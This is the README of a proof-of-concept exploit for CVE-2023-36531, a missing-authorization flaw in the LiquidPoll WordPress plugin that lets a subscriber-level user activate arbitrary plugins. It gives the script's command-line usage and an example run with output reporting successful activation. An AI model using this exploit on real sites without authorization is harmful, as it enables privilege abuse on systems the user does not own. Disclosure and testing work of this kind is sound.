# CVE-2023-36531
LiquidPoll – Advanced Polls for Creators and Brands &lt;= 3.3.68 - Missing Authorization via activate_addon

Info
----

Needs a subscriber level user and the plugin needs to be disabled.
This will activate the plugin you provide.


Usage
---

```
usage: CVE-2023-36531.py [-h] -w URL -u USERNAME -p PASSWORD -a ADDON

WordPress CVE-2023-36531 Exploit

options:
  -h, --help            show this help message and exit
  -w URL, --url URL     URL of the WordPress site
  -u USERNAME, --username USERNAME
                        Username of your wordpress user
  -p PASSWORD, --password PASSWORD
                        Password of your wordpress password
  -a ADDON, --addon ADDON
                        Plugin Slug
```

Example
---

```
python3 CVE-2023-36531.py -w http://wordpress.lan -u user -p useruser1 -a wp-polls
Logged in successfully.
POST request sent successfully.
Plugin Activated.
```
